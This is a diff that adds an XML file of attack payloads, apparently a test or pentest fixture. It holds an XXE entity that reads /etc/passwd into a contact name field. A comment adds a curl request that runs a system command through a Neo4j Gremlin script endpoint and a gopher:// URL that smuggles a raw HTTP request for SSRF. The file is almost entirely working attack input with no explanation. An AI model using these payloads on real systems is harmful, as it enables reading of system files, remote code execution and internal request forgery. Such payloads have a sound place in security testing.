@@ -1,0 +1,17 @@
+<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<!DOCTYPE root [<!ENTITY xxx SYSTEM "/etc/passwd">]>
+<contact>
+    <name>&xxx;</name>
+    <lastName>test</lastName>
+</contact>
+
+<!--
+curl -X POST
+http://localhost:7474/db/data/ex/GremlinPlugin/graphdb/execute_script
+-d '{"script":"import java.lang.Runtime;rt = Runtime.getRuntime().exec(\"xclock\")", "params": {} }'
+-H "Content-Type: application/json"
+
+
+gopher://localhost/1POST%20%2fHTTP%2f1.1%0d%0aHost:localhost%0d%0aContent-Length:5%0d%0a%0d%0a
+
+-->
